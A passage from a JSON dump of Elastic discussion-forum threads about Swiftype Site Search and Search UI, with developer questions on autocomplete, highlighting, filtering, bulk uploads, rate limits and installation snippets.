    "body": "Hi All, I have code implemented with react elastic search ui component \"SearchBox\" to have autocompleteSuggestions. With documentation seems this should work for all engine types. But I am stuck on achieving this feature, can anyone help on this !! Config : export const searchEngineConfig = { apiConnector: searchEngineConnector, autocompleteQuery: { suggestions: { types: { documents: { fields: ['title'] } }, size: 4 } } } };",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "a23dba11-4fc1-42da-a6bf-e591bbfd20ea",
    "url": "https://discuss.elastic.co/t/highlight-fields-not-matching-multiple-words/211383",
    "title": "Highlight fields not matching multiple words",
    "category": [
      "Site Search"
    ],
    "author": "Dileep_Ratnayake",
    "date": "December 10, 2019, 10:01pm December 11, 2019, 10:32am January 8, 2020, 10:32am",
    "body": "I'm trying to get swiftype to highlight search results in a multiple keywords search. If a result body and/or title has atleast one of the keywords matched, they need to be highlighted. I also noticed that if a result has matching keywords, they are not highlighted either. It only highlights if the search is only one keyword which leads me to believe that multiple keyword highlights are ignored? data: { engine_key : 'EngineKeyGoesHere', q: keyword, per_page: 10, page: pageNum, spelling: \"strict\", highlight_fields: {'page': {'title': {'size': maxStrLen, 'fallback': true },'body': {'size': maxStrLen, 'fallback': true }}}, }, I have verified that there are matching keywords with in the maxStrLen limit. Any idea on what I can do get matching keywords (individual) to be highlighted in a multiple keyword search?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "7b91c466-f525-49f8-acf1-c3f310581c0f",
    "url": "https://discuss.elastic.co/t/filtering-by-nonexistent-value-returns-all-results/207752",
    "title": "Filtering by nonexistent value returns all results",
    "category": [
      "Site Search"
    ],
    "author": "Ryan_Peters",
    "date": "November 13, 2019, 5:11pm November 15, 2019, 12:02pm December 13, 2019, 12:02pm",
    "body": "My query: { engine_key: 'ENGINE_KEY', q: '', page: 1, per_page: 12, sort_field: { page: 'published_date' }, filters: { page: { search_category: 'How-To Tips & Tricks' } } } If there are no pages with this search_category tag on the page, it will return all results. If there is 1 page tagged with this search_category, it will return that one page. I would expect no results if no pages are tagged with this category. Is it possible to run a query where no results are returned on a filter that has no matches?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "5f60d2c1-f7e4-4ec9-83e8-bdf6e76bd83b",
    "url": "https://discuss.elastic.co/t/search-ui-styles-are-not-read-in-production-build-of-gatsby/206501",
    "title": "Search UI styles are not read in production build of Gatsby",
    "category": [
      "Site Search"
    ],
    "author": "sarrame",
    "date": "November 5, 2019, 1:01am November 5, 2019, 1:33pm November 5, 2019, 2:16pm November 5, 2019, 2:38pm November 6, 2019, 1:26pm November 6, 2019, 7:38pm November 12, 2019, 2:18pm November 12, 2019, 5:24pm November 12, 2019, 5:52pm November 12, 2019, 6:06pm November 14, 2019, 8:27pm December 12, 2019, 8:28pm",
    "body": "Hi Team, As i am actively building a Site Search with SearchUI and did a production build of Gatsby, interestingly Paging is the only component i used directly with built-in styles. I could see default pagination in development code like <1 2 > . but in Gatsby production build there are no styles applied and i see unordered list like below 1 2 Implementation ways : import { Paging } from '@elastic/react-search-ui'; import '@elastic/react-search-ui-views/lib/styles/styles.css'; And simply imported in the render component. Am not sure did i miss anything in implementation ., could any one help me on this.",
    "website_area": "discuss",
    "replies": 12
  },
  {
    "id": "b83e6f47-23f5-423d-926d-a76648396eb7",
    "url": "https://discuss.elastic.co/t/cant-configure-search-results-to-show-up/207401",
    "title": "Can't configure search results to show up",
    "category": [
      "Site Search"
    ],
    "author": "Cosmin_Mazilu",
    "date": "November 11, 2019, 5:31pm November 13, 2019, 12:48am November 13, 2019, 12:44pm December 11, 2019, 12:44pm",
    "body": "Hello, I’m trying to configure site search for our company. I’ve set up the search engine which has crawled the site and seems to work fine (checked the preview and it’s OK). I can’t seem to get the search results to show up based on the instructions provided. For instance, if I create the following htm page, the search results won’t load. <!DOCTYPE html> <html> <body> <script type=\"text/javascript\"> (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){ (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t); e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e); })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st'); _st('install','ECV_azmEAz1k44a7uf-y','2.0.0'); </script> <input type=\"text\" class=\"st-default-search-input\"> <div class=\"st-search-container\"></div> </body> </html> What am I doing wrong?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "ab64d6c6-6e24-4120-a7ab-aa568048afad",
    "url": "https://discuss.elastic.co/t/crawler-not-reading-class-swifttype/206095",
    "title": "Crawler not reading class \"swifttype\"",
    "category": [
      "Site Search"
    ],
    "author": "sarrame",
    "date": "October 31, 2019, 7:55pm October 31, 2019, 8:01pm October 31, 2019, 8:02pm October 31, 2019, 8:05pm October 31, 2019, 8:17pm October 31, 2019, 8:50pm November 4, 2019, 10:10pm November 5, 2019, 10:27pm November 5, 2019, 11:34pm November 8, 2019, 9:52pm November 8, 2019, 10:45pm December 6, 2019, 10:45pm",
    "body": "Hi Team, As per the documentation meta tags with class \"swifttype\" will be read by Swiftbot, but it is not working . I added this class to meta tag name \"description\" like below and i don't see this data in the document created after crawling. Can anyone help on this ? Thanks !",
    "website_area": "discuss",
    "replies": 12
  },
  {
    "id": "e42c62e2-59db-4d1f-8ed3-d03b3dbd4586",
    "url": "https://discuss.elastic.co/t/customize-style-for-paging-component-of-search-ui/205542",
    "title": "Customize style for paging component of Search UI",
    "category": [
      "Site Search"
    ],
    "author": "sarrame",
    "date": "October 28, 2019, 8:03pm October 29, 2019, 6:52pm October 29, 2019, 7:11pm October 29, 2019, 7:41pm October 31, 2019, 7:57pm December 3, 2019, 12:34am",
    "body": "Hello, I am using Site Search with SearchUI and I want to create a custom styles for react-search-ui component. I went over the documentation https://github.com/elastic/search-ui/blob/master/ADVANCED.md#component-views-and-html this looks like letting you modify the onChange, but i looking to have custom styling. for example, I want different styles and different arrows to be used. I am using styled-components. Please help !",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "9790f08a-b71b-4b08-a8a4-60695bfdc3fb",
    "url": "https://discuss.elastic.co/t/autocomplete-for-sitesearch-in-searchui/205283",
    "title": "Autocomplete for siteSearch in SearchUI",
    "category": [
      "Site Search"
    ],
    "author": "sarrame",
    "date": "October 25, 2019, 2:42pm October 25, 2019, 4:50pm October 25, 2019, 5:44pm October 28, 2019, 8:02pm October 29, 2019, 11:39am November 26, 2019, 11:39am",
    "body": "I am trying to fix autocomplete for the SiteSearch Engine with SearchUI. I am unable to fix autocomplete with headless core components(my own build component) whereas it works for \"SearchBox\" SearchUI built-in component. I tried to add \"beforeAutocompleteResultsCall\" but not working. beforeAutocompleteResultsCall: (options, next) => next({ ...options, group: { field: 'title' } }) Please provide help !",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "2395bed0-4e1b-49b8-9ac8-94a04efc1d5f",
    "url": "https://discuss.elastic.co/t/bulk-upload-documents-to-site-search-from-a-json-file/205147",
    "title": "Bulk upload documents to Site Search from a JSON file",
    "category": [
      "Site Search"
    ],
    "author": "JasonStoltz",
    "date": "October 24, 2019, 7:45pm November 21, 2019, 7:41pm",
    "body": "I just wanted to share some code I helped put together for a customer. They had a JSON document of records that they wanted to upload in bulk to Site Search via our API. books.json [ { \"id\": \"1\", \"title\": \"Tom Sawyer\", \"pages\": 200 }, { \"id\": \"2\", \"title\": \"Catcher in the Rye\", \"pages\": 300 } ] The first challenge was converting their JSON file to a format that Site Search requires. We came up with the following: convert.js var FILE_NAME = \"books.json\"; var isValidNumber = num => { return !isNaN(num); }; var fs = require(\"fs\"); var obj = JSON.parse(fs.readFileSync(FILE_NAME, \"utf8\")); var convert = o => { return Object.entries(o).reduce( (p, [k, v]) => { if (k === \"id\") { return { external_id: v, ...p }; } return { ...p, fields: p.fields.concat({ name: k, value: v, type: isValidNumber(v) ? \"number\" : \"string\" }) }; }, { fields: [] } ); }; var updated = obj.map(convert); fs.writeFile(\"updated.json\", JSON.stringify(updated), err => { if (err) throw err; }); Assuming that convert.js is located in the same directory as books.json, you would run: node convert.js This produces a file in the correct format for Site Search: updated.json [ { \"external_id\": \"1\", \"fields\": [ { \"name\": \"title\", \"value\": \"Tom Sawyer\", \"type\": \"string\" }, { \"name\": \"pages\", \"value\": 200, \"type\": \"number\" } ] }, { \"external_id\": \"2\", \"fields\": [ { \"name\": \"title\", \"value\": \"Catcher in the Rye\", \"type\": \"string\" }, { \"name\": \"pages\", \"value\": 300, \"type\": \"number\" } ] } ] We then created another file in the same directory, and configured our API key, document type, and engine name: upload.js var ENGINE_NAME = \"book-engine\"; var DOCUMENT_TYPE = \"books\"; var API_KEY = \"{YOUR_KEY_HERE}\"; var fs = require(\"fs\"); var json = JSON.parse(fs.readFileSync(\"updated.json\", \"utf8\")); var SiteSearchClient = require(\"@elastic/site-search-node\"); var client = new SiteSearchClient({ apiKey: API_KEY }); client.documents.batchCreate( { engine: ENGINE_NAME, documentType: DOCUMENT_TYPE }, json, 100, (e, o) => { console.log(e); console.log(o); } ); We then installed the site search node client, and then ran our script: npm install @elastic/site-search-node node upload.js And voilà, our documents have now been indexed.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "fb4cb654-1b12-409d-a821-6f86f05edf97",
    "url": "https://discuss.elastic.co/t/rate-limit-exceeded/203867",
    "title": "Rate limit exceeded",
    "category": [
      "Site Search"
    ],
    "author": "Patrick_Simard",
    "date": "October 16, 2019, 3:00pm October 22, 2019, 8:02pm November 19, 2019, 8:02pm",
    "body": "I currently have a demo account. I am trying to make a POC using SwifType for my employer. We have a very big database that is indexec every 1h and creates a JSON file. I thought the integration with Elastic would be very easy considering it's only a mater of sending the string when it's generated. I used PHP Curl and got a connection to the API. The code sends out part of the data and then freaks out with a \"Rate limit exceeded\" error. How can I manage around that error and get the full JSON indexed? My code looks like this at the moment: // SENDING DATA TO ELASTIC SEARCH $arr = array_change_key_case($arr, CASE_LOWER); // Keys to lower case $arrlist = array_chunk($arr,100); // Split to chunks of 100 foreach($arrlist as $key=>$arr){ $json = json_encode($arr); // Making the JSON string from the array $ch = curl_init('https://host-***.api.swiftype.com/api/as/v1/engines/***/documents'); curl_setopt($ch, CURLOPT_POST, 1); curl_setopt($ch, CURLOPT_POSTFIELDS, $json); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); $headers = array(); $headers[] = 'Content-Type: application/json'; $headers[] = 'Authorization: Bearer private-***'; curl_setopt($ch, CURLOPT_HTTPHEADER, $headers); $result = curl_exec($ch); if (curl_errno($ch)) { echo 'Error:' . curl_error($ch); } curl_close($ch); echo $result.\"<hr>\"; } Also, considering this code is going to be indexed every hour, if I am sending the same data over and over, will it UPDATE the previous one or will it duplicate it? If so, how can I manage that?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "150fb7af-0313-4b3c-b4b7-63ce62cd9935",
    "url": "https://discuss.elastic.co/t/filtering-from-default-javascript/203265",
    "title": "Filtering from default Javascript",
    "category": [
      "Site Search"
    ],
    "author": "DeDev",
    "date": "October 11, 2019, 3:56pm October 22, 2019, 7:57pm November 19, 2019, 7:57pm",
    "body": "Is there any way to filter results using the Javascript snippet below? Instead of creating a lot of files for my project. (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){(w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t); e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e); })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');_st('install','xxx-xxxx-xxx','2.0.0');",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "c3bf7e50-efe0-4cce-a685-d4cca928cf50",
    "url": "https://discuss.elastic.co/t/are-document-types-still-a-thing/202382",
    "title": "Are document_types still a thing?",
    "category": [
      "Site Search"
    ],
    "author": "webinc",
    "date": "October 7, 2019, 7:02am October 7, 2019, 7:04am November 4, 2019, 7:04am",
    "body": "I'm just starting with swiftype and elastic search (are they really the same now?). And I followed the instructions here to add document types to my engine, so I could bulk-upload documents that way. Its not clear to me that it worked however, and I don't see any references to 'document_types' in my swiftype dashboard. Neither can I get the api call to work showing me document_types in my engine, and nor can I find a way to add documents to a particular document_type using the Documents API. So either I'm missing something, or doing it wrong (very likely) or is the current documentation at odds with the old? Something which makes me wonder that is that I can't get either of my swiftype api keys (public or private) to work with the call to display existing document_types: curl -X GET 'https://api.swiftype.com/api/v1/engines/bookstore/document_types.json?auth_token=YOUR_API_KEY' This is documented here. Any help and advice would be much welcomed. I like the idea of document_types for my data, but I'm unsure if they exist... Thanks",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "0fbf671d-f7b9-4be6-a744-d0cf3f3ec714",
    "url": "https://discuss.elastic.co/t/filter-fields-on-list-documents/201893",
    "title": "Filter fields on list documents?",
    "category": [
      "Site Search"
    ],
    "author": "Sophistifunk",
    "date": "October 2, 2019, 4:56am October 3, 2019, 3:04am October 3, 2019, 3:04am October 31, 2019, 3:04am",
    "body": "Is it possible to filter the list of returned fields when GETting ..../documents.json? I need a way to get a list of documents that are in the index without having to download the complete content of every document.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "d58cdc5d-c782-4413-965b-f19f1b4ef493",
    "url": "https://discuss.elastic.co/t/how-to-install-two-search-engines-in-one-site/200167",
    "title": "How to Install two search engines in one site",
    "category": [
      "Site Search"
    ],
    "author": "Carlos_Lozada",
    "date": "September 19, 2019, 10:44am September 19, 2019, 3:25pm September 20, 2019, 9:04am October 18, 2019, 9:04am",
    "body": "Hello Guys, I have created two search engines on site-search each specific to the corresponding sitemaps according to the language of the search Engine Search for Spanish looking only at the sitemaps for Spanish Engine Search for English looking only at the sitemaps for English This has been done correctly, now the problem resides to install it on my e-commerce I have tried using both scripts given but I got the error message to install only one So I did it in this way <!-- Swiftype --> <script type=\"text/javascript\"> (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){ (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t); e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e); })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st'); if (window.location.href.indexOf('/es') !== -1) { _st('install', '<CODE-ES>', '2.0.0'); } else if (window.location.href.indexOf('/en-ie') !== -1) { _st('install','<CODE-EN>', '2.0.0'); } </script> <!-- End Swiftype --> Now I only get the search result in one of the two engines added and according to the Url were I'm at For example: If I'm in /es give me results for Spanish (this is Ok as my main language for the store) if I'm/en-ie give me results for English: Thanks for your time",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "d532c78c-d768-4526-a267-62ed200bfbdf",
    "url": "https://discuss.elastic.co/t/to-whitelist-swiftype-search/192659",
    "title": "To Whitelist Swiftype Search",
    "category": [
      "Site Search"
    ],
    "author": "khaingsh",
    "date": "July 29, 2019, 9:33am July 29, 2019, 3:38pm July 30, 2019, 2:11am November 19, 2019, 1:51pm July 31, 2019, 3:45pm August 1, 2019, 6:28am August 1, 2019, 1:56pm August 21, 2019, 5:20am September 18, 2019, 5:24am",
    "body": "Hi, Swifttype search is set up for the website and it is working fine at the public but in our office network, it is being blocked and showing 403. So, I need to whitelist swifttype at our office network to make it works. May I know what url/service/IP need to be whitelisted? Regards, Khaing Su Hlaing",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "10f3ea64-9d6a-466c-a69d-7f745b2331c1",
    "url": "https://discuss.elastic.co/t/how-to-get-same-results-in-autocomplete-search-results-in-swiftype/191721",
    "title": "How to get same results in autocomplete & search results in swiftype?",
    "category": [
      "Site Search"
    ],
    "author": "nabtron",
    "date": "July 23, 2019, 12:35am August 20, 2019, 12:35am",
    "body": "I am using swiftype for WordPress and can customize it as needed. The query basically is, how to achieve the same results ranking in autocomplete (when the query is complete) and then we press enter and then get the results on the page? Thanks.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "35abc1ce-fcb8-4e8c-9d12-dcb9cef9780d",
    "url": "https://discuss.elastic.co/t/search-result-description-issue/190123",
    "title": "Search result description issue",
    "category": [
      "Site Search"
    ],
    "author": "bluejay0018",
    "date": "July 11, 2019, 11:43pm July 12, 2019, 12:05am July 12, 2019, 12:45am July 12, 2019, 12:57am July 12, 2019, 2:10pm July 12, 2019, 3:12pm August 9, 2019, 3:12pm",
    "body": "Search result description is showing \"Loading error messages\" which are part of the page. This is happening even after adding the \"data-swiftype-index=false\" to those tags in the page. See screenshot below, any recommendation will be great? We are using SFDC for our communities portal. image.png1244×234 58.9 KB",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "0b1f3980-67ac-4482-a0b2-088cd0517b04",
    "url": "https://discuss.elastic.co/t/error-when-using-search-ui-and-site-search-map-is-undefined/189786",
    "title": "Error when using search ui and site search - map is undefined",
    "category": [
      "Site Search"
    ],
    "author": "elitzur_e",
    "date": "July 10, 2019, 2:34pm July 10, 2019, 7:18pm July 11, 2019, 5:35am July 11, 2019, 12:12pm July 11, 2019, 1:32pm July 11, 2019, 1:52pm July 11, 2019, 2:10pm July 11, 2019, 2:17pm August 8, 2019, 2:26pm",
    "body": "hi im using the latest search-ui (0.12) with the example code that works fine. when changing it to use the site search connector and updating the .env file (and some other small stuff to match it) i went on to remove all the facets etc. to have the minimum needed to have a search page. i used a search engine that already scanned one of my sites (apx. 2k pages) I get this error in the page: An unexpected error occurred: Cannot read property 'map' of undefined this is the app.js: https://jsfiddle.net/viper123/7h1wx2vo/",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "24e9b07e-843e-4834-bc93-3a753683e818",
    "url": "https://discuss.elastic.co/t/error-when-trying-to-implement-jqeury-for-siteseaerch/186684",
    "title": "Error when trying to implement jqeury for siteseaerch",
    "category": [
      "Site Search"
    ],
    "author": "elitzur_e",
    "date": "June 20, 2019, 12:30pm June 23, 2019, 2:25pm June 27, 2019, 12:48pm July 1, 2019, 7:17pm July 4, 2019, 6:03pm July 5, 2019, 5:24am July 8, 2019, 3:22pm July 9, 2019, 11:33am July 9, 2019, 7:30pm July 10, 2019, 2:05pm August 7, 2019, 2:05pm",
    "body": "Hi. im am following this official guide for jQuery Plugin Guide: Swiftype jQuery Plugin Guide | Swiftype Documentation Learn how to get the most out of Swiftype when loading the needed scripts i get an error: Uncaught TypeError: Cannot read property 'msie' of undefined at jquery.ba-hashchange.min.js:9 is this guide out of date? has anyone tried to use it? thanks",
    "website_area": "discuss",
    "replies": 11
  },
  {
    "id": "c573fc32-b6a2-4539-aaa7-d3236fddd34e",
    "url": "https://discuss.elastic.co/t/more-endpoints-for-site-search-analytics-api/188785",
    "title": "More endpoints for Site Search Analytics API?",
    "category": [
      "Site Search"
    ],
    "author": "katyd",
    "date": "July 3, 2019, 5:29pm July 3, 2019, 7:19pm July 31, 2019, 7:19pm",
    "body": "We're in the process of automating our Site Search analytics to bring visibility to our team and track action items. https://swiftype.com/documentation/site-search/analytics has valuable endpoints, but there are few that we'd also like to have to streamline this process. Are there any plans to add endpoints for the following: Most commonly clicked documents from search Top searches with zero clickthroughs % of search with no results (I think we could calculate this via the Searches and Top no result queries endpoints, but would be helpful to not need to make two requests.) Thanks!",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "d54c6b0c-01cb-4e6b-ae71-5533b1e5b574",
    "url": "https://discuss.elastic.co/t/trademark-in-title-overridden/184399",
    "title": "Trademark in title overridden?",
    "category": [
      "Site Search"
    ],
    "author": "buckwebdev",
    "date": "June 5, 2019, 2:54pm June 5, 2019, 3:35pm July 3, 2019, 3:35pm",
    "body": "I'm having an issue with my trademarks (™) being overwritten with questions marks (?) in my titles. The display issue only occurs in the search field. My product titles are fine on WP backend and show no issue. Any advice would be appreciated.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "4e60fd2d-dc19-43a8-8592-bf0725b4b639",
    "url": "https://discuss.elastic.co/t/case-sensitivity-question/183737",
    "title": "Case sensitivity question",
    "category": [
      "Site Search"
    ],
    "author": "jamesgrobertson",
    "date": "May 31, 2019, 2:30pm May 31, 2019, 4:28pm June 28, 2019, 4:28pm",
    "body": "I have a question about case sensitivity in autocomplete searches vs. in search filters. If I type \"search term\", \"Search Term\", or \"SEARCH TERM\" in the autocomplete (implemented using the Swiftype jQuery autocomplete plugin) I get the same results. I have implemented the filtering functionality of the Search API using some form fields, and if I enter the same terms as above, I only get results when the case matches what is in the index. I suspect this is because autocomplete searches are suggest queries while filters are full text queries, but I can't find where it states this in the documentation. If that is the case, is there a way to make filters work as suggest queries (i.e. case-insensitive)?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "1923676f-2386-40a6-ae12-7a19c5f1ed11",
    "url": "https://discuss.elastic.co/t/uncaught-typeerror-window-ga-is-not-a-function/181066",
    "title": "Uncaught TypeError: window.ga is not a function",
    "category": [
      "Site Search"
    ],
    "author": "highered",
    "date": "May 14, 2019, 8:16pm May 14, 2019, 8:25pm May 15, 2019, 2:06pm May 14, 2019, 8:50pm May 14, 2019, 9:02pm May 14, 2019, 9:27pm May 15, 2019, 2:06pm May 15, 2019, 2:08pm May 15, 2019, 2:36pm June 12, 2019, 2:36pm",
    "body": "We're trying to implement Site Search with a custom search field. However, if a user types something in the field and then hits \"return\", this error appears in the console: st.js:73 Uncaught TypeError: window.ga is not a function at Object.n.Utils.pushToGA (st.js:73) at Swiftype.QueryContext.pQueryContext.pushQueryToGA (st.js:74) at Swiftype.QueryComposer.pQueryComposer.runSearch (st.js:74) at HTMLInputElement.<anonymous> (st.js:74) at HTMLInputElement.dispatch (st.js:25) at HTMLInputElement.y.handle (st.js:24) What is this error and how do we fix it? Thanks!",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "710ee630-de18-42a9-adad-3176d11a693f",
    "url": "https://discuss.elastic.co/t/presenting-two-different-type-results-separately-on-the-same-page/180895",
    "title": "Presenting two different type results separately on the same page",
    "category": [
      "Site Search"
    ],
    "author": "bobclewell",
    "date": "May 13, 2019, 9:26pm June 10, 2019, 9:31pm",
    "body": "I've got a database of two types, products and blog entries. Right now we are using Swiftype to search the full database and return all the results merged together as a single result set. I'd like to separate products, so that I can highlight them at the top of the page, with images, and then have the blog entries listed under them, in a separate part of the page, as text results only. How would I do this?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "f3254a44-11ec-47de-95ca-561a49548b73",
    "url": "https://discuss.elastic.co/t/no-documents-after-20-hours-of-crawling/179504",
    "title": "No documents after 20 hours of crawling",
    "category": [
      "Site Search"
    ],
    "author": "Hiren_Patel",
    "date": "May 3, 2019, 9:21am May 3, 2019, 5:03pm May 3, 2019, 11:29pm May 7, 2019, 6:13pm May 7, 2019, 8:08pm May 7, 2019, 8:11pm May 7, 2019, 10:22pm June 4, 2019, 10:22pm",
    "body": "I've initiated a manual crawl 20 hours ago however I see no documents in the control panel. I see a \"Swiftype is currently indexing content for domains in this search engine. Pages will become available as they are indexed.\" message, but I suspect there's some issue that I'm not seeing. I have a valid sitemap generated based on the guides provided, and I can see Swiftbot hitting our servers. Is there a problem, because I don't see what I'm doing wrong. We're on the Pro Plan and the engine key is: HApht89NAVsMfYA37u4p Kind regards, Hiren",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "71926806-5fc2-42b2-a380-d5a0486e6441",
    "url": "https://discuss.elastic.co/t/request-for-site-search-react-demo-demonstrating-pagination/179176",
    "title": "Request for site-search react demo demonstrating pagination",
    "category": [
      "Site Search"
    ],
    "author": "shameer-rahman",
    "date": "May 1, 2019, 7:18am May 1, 2019, 12:20pm May 29, 2019, 12:19pm",
    "body": "I'm trying to implement pagination using site-search api on my gatsby website, can you please share me the demo repo for the same like you have it for app-search: https://github.com/swiftype/app-search-demo-react",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "ed4a2d8f-cfb7-42c9-8d77-8c0656851e63",
    "url": "https://discuss.elastic.co/t/australian-datacenter/176499",
    "title": "Australian Datacenter?",
    "category": [
      "Site Search"
    ],
    "author": "Kim_Pepper",
    "date": "April 11, 2019, 9:12pm April 11, 2019, 10:21pm April 30, 2019, 5:50am April 30, 2019, 3:25pm May 28, 2019, 3:25pm",
    "body": "We are evaluating Site search for clients based in Australia. Is the managed Site search (Swiftype) located in Australia? We would like to minimise latency. Thanks!",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "9787140d-04dc-4a69-866a-7931bf108fd2",
    "url": "https://discuss.elastic.co/t/search-response-in-a-progressive-way/177248",
    "title": "Search response in a progressive way",
    "category": [
      "Site Search"
    ],
    "author": "luka7",
    "date": "April 17, 2019, 9:13am May 15, 2019, 9:12am",
    "body": "Hi, getPayload() { let textsearch = this.textsearch.replace(/ /g,\" AND \"); return { q: textsearch, lang: this.$store.getters.getLang || 'en', engine: this.getSwiftypeEngine } } I am trying to query swiftype engine and get the response in a progressive way. It means that: When I search for: “elastic” I get an array of objects with 20 results and a property title starting with \"elastic\" word When I search for: “elastic s” I get an array of objects with 20 results and a property title starting with exactly “elastic c” I tried already to change the algorithm by passing AND between two keywords (that works better but not exactly as I would expect). Free-text Query Syntax Text searches support a basic subset of the standard Lucene query syntax. The supported functions are: double quoted strings, + and -, AND, OR, and NOT. Visit the Lucene documentation for more information. Do I need to pass anything additional? Is it possible to omit completely the score and return results only containing exact amount of letters?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "d0c03b64-e43b-467e-ae49-7b236fb567ba",
    "url": "https://discuss.elastic.co/t/only-exact-search-matches-for-quoted-phrases/176698",
    "title": "Only Exact Search Matches for Quoted Phrases",
    "category": [
      "Site Search"
    ],
    "author": "timlwhite",
    "date": "April 12, 2019, 7:35pm April 12, 2019, 8:04pm April 15, 2019, 2:47pm May 13, 2019, 2:47pm",
    "body": "Hello - I need to enable searches that return only exact matches for quoted phrases. For example \"Bank of America\" should not return results that only contain \"America\" or \"bank\" as these are common words in the search corpus. I have tried using escaped quotations, \"Bank of America\" as well as other various versions of quoting strings, and I continue to get non-exact matches. Google does this quite well, I am trying to determine how to coerce SwiftType to do the same. Thank you!",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "051051ad-0d2c-4c8a-b012-d03d8a011b9b",
    "url": "https://discuss.elastic.co/t/how-to-get-metrics-of-a-single-domain/173820",
    "title": "How to get metrics of a single domain",
    "category": [
      "Site Search"
    ],
    "author": "MaryP",
    "date": "March 25, 2019, 7:11pm March 25, 2019, 7:21pm March 25, 2019, 7:27pm March 25, 2019, 10:38pm April 11, 2019, 4:19pm May 9, 2019, 4:19pm",
    "body": "When I export metrics from Swiftype, it gives me some of the data but not on the domain I need it from. We currently have five domains listed, but I only need data from Support.veeva.com domain. How do I get that?",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "beffac71-d96b-4375-aea6-908309462e39",
    "url": "https://discuss.elastic.co/t/swiftype-node-cors/175025",
    "title": "Swiftype-node & CORS",
    "category": [
      "Site Search"
    ],
    "author": "katyd",
    "date": "April 2, 2019, 3:20pm April 2, 2019, 4:09pm April 2, 2019, 4:37pm April 10, 2019, 3:57pm April 2, 2019, 7:11pm April 8, 2019, 11:15pm April 9, 2019, 12:00am April 9, 2019, 12:07pm April 9, 2019, 3:31pm April 10, 2019, 12:43pm May 8, 2019, 12:43pm",
    "body": "I'm having trouble developing locally with https://github.com/swiftype/swiftype-node as I'm running into CORS errors. I know I can open an instance of Chrome with web security disabled, but I'm hoping to avoid that. Anyone have suggestions or examples?",
    "website_area": "discuss",
    "replies": 11
  },
  {
    "id": "8bd88f4d-b58b-443b-9d36-f556a90c8ee9",
    "url": "https://discuss.elastic.co/t/multiple-range-searches-on-one-search-field-in-query/175263",
    "title": "Multiple range searches on one search field in query",
    "category": [
      "Site Search"
    ],
    "author": "ashtonlance",
    "date": "April 3, 2019, 6:26pm April 4, 2019, 3:56pm May 2, 2019, 3:56pm",
    "body": "I'm trying to run a query that on a field called bookable_date . I want to be able to return results that have a bookable_date in May and a bookable_date in July and not return results for the month of June. I'm using the first-party PHP client here: https://github.com/swiftype/swiftype-site-search-php Here's one of my approaches -- no results. $args['bookable_date'] = array( \"type\"=> \"or\", \"values\"=> array( array( \"type\"=>\"range\", \"from\"=>'2019-01-01T00:00:00+00:00', \"to\"=> '2019-01-31T00:00:00+00:00', ), array ( \"type\"=>\"range\", \"from\"=>'2019-05-01T00:00:00+00:00', \"to\"=> '2019-05-31T00:00:00+00:00', ) ) ); The $args variable is later passed to $st_args in the filters array. Which is then sent to Swiftype like this: $response = $client->search($engine , stripslashes($s), $st_args);",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "2bfe5062-73d9-4e64-a7c2-a6fe3308f184",
    "url": "https://discuss.elastic.co/t/need-explanation-of-swiftype-reports-ootb/173773",
    "title": "Need explanation of Swiftype reports OOTB",
    "category": [
      "Site Search"
    ],
    "author": "MaryP",
    "date": "March 25, 2019, 2:33pm March 25, 2019, 2:36pm March 25, 2019, 2:45pm March 25, 2019, 2:48pm March 25, 2019, 3:19pm March 25, 2019, 3:42pm March 25, 2019, 3:53pm March 25, 2019, 3:54pm March 25, 2019, 3:55pm April 22, 2019, 3:55pm",
    "body": "Is there any documentation regarding the reports that are created in Swiftype?",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "76207a81-19a6-4574-b14e-868b6de94aa6",
    "url": "https://discuss.elastic.co/t/sitemap-in-swiftype/173569",
    "title": "Sitemap in Swiftype",
    "category": [
      "Site Search"
    ],
    "author": "Amit_Jain1",
    "date": "March 22, 2019, 11:23pm March 22, 2019, 11:40pm April 19, 2019, 11:40pm",
